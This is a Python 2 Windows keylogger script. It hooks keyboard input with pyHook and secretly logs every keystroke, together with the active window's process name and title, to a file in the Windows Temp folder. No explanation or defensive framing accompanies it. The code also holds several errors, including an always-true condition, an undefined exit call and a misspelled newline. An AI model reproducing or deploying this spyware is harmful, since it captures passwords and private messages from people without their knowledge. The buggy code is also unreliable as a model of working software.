# -*- coding: utf-8 -*-
from ctypes import *
import pyHook
import pythoncom
import win32clipboard
import win32console
import win32gui
import win32api
import sys

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None

def get_current_process():

    hwnd = user32.GetForegroundWindow()

    # PID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # PID save
    process_id = "%d" % pid.value

    # get faile naem
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # get title name 
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
    
    f=open('c:\\WINDOWS\\Temp\\xm.txt','a')
    f.write("'\n'")
    f.write ("[ PID: %s - %s - %s ]'\n'" % (process_id, executable.value, window_title.value))
    f.close
  

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):

    global current_window   

    # window
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()

    # key
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
        f=open('c:\\WINDOWS\\Temp\\xm.txt','a')
        f.close()
        f=open('c:\\WINDOWS\\Temp\\xm.txt','r')
        buffer=f.read()
        f.close()
        f=open('c:\\WINDOWS\\Temp\\xm.txt','w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs='/n'
        buffer+=keylogs
        f.write(buffer)
        f.close()

    return True

kl         = pyHook.HookManager()
kl.KeyDown = KeyStroke
kl.HookKeyboard()
pythoncom.PumpMessages()
